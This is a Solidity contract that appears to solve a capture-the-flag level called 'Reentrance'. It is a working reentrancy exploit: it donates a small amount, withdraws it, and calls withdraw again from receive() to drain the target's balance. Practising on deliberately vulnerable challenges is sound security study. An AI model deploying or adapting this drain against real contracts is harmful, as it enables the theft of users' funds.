// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Version is old, overflows
//The goal of this level is for you to steal all the funds from the contract.

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external ;
    function balanceOf(address _who) external view returns (uint256);
}

contract ReentranceAttack {   
    Reentrance reentrance;
    uint256 public amount = 106 wei;

    constructor (address payable _contractToAttack) payable{
        reentrance = Reentrance(_contractToAttack);
    }

    function attack () public {
        reentrance.donate{value: 106 wei}(address(this));
        reentrance.withdraw(106 wei);
    }
    //No access control

    receive() external payable { 
       uint targetBalance = address(reentrance).balance;
            // Attempt to drain by calling withdraw again
            if (targetBalance >= 106 wei){
                reentrance.withdraw(amount);
            }


    }

}
